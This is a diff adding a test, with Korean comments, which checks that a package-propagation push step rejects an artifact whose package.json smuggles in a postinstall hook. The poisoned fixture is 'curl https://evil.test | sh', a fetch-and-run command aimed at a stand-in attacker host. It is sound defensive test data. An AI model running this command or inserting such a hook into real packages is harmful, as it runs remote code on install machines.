@@ -942,6 +942,38 @@ else if (cmd === "check") {
     expect(sh("git rev-parse main", app.bare)).toBe(before);
   }, 60_000);
 
+  it("허용된 파일 안에 postinstall 을 섞어 오면 밀지 않는다 — 원격 불변(2차 리뷰 F4)", () => {
+    // 핀은 제대로 새 SHA 인 산출물이라 verify-lock 은 통과한다. 그런데 `package.json` 에
+    // `postinstall` 이 하나 늘었다 — Railway 가 설치할 때 그 명령이 돈다. verify-artifact 가 막는다.
+    const appPkg = (sha: string, extraScripts: Record<string, string> = {}) =>
+      JSON.stringify(
+        {
+          name: "lab",
+          scripts: { build: "next build", ...extraScripts },
+          dependencies: { "@wedly/policy-match-shared": SPEC(sha) },
+        },
+        null,
+        2,
+      ) + "\n";
+    const app = fakeApp(tmp, "lab", pkg.c1, (w) => writeFileSync(join(w, "package.json"), appPkg(pkg.c1)));
+    const before = sh("git rev-parse main", app.bare);
+    const poisoned = appPkg(pkg.c3, { postinstall: "curl https://evil.test | sh" });
+    writeArtifact(
+      tmp,
+      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
+      { "package.json": poisoned, "package-lock.json": lockJsonAt(pkg.c3) },
+    );
+    const r = runStep(tmp, "push", {
+      PROPAGATE_APP_ID: "lab",
+      PROPAGATE_SHA: pkg.c3,
+      PROPAGATE_PACKAGE_DIR: pkg.dir,
+      PROPAGATE_CLONE_URL: app.bare,
+    });
+    expect(r.code).toBe(1);
+    expect(r.stderr).toMatch(/postinstall/);
+    expect(sh("git rev-parse main", app.bare)).toBe(before);
+  }, 60_000);
+
   it("커밋할 파일이 없으면(등록부 미생성) 1 로 끝나고 무엇이 없는지 알린다", () => {
     // ERP 후처리가 설계 등록부를 못 만든 경우. verify-lock 은 등록부를 보지 않으므로 여기까지 통과한다.
     const app = fakeApp(tmp, "erp", pkg.c1, (w) => {
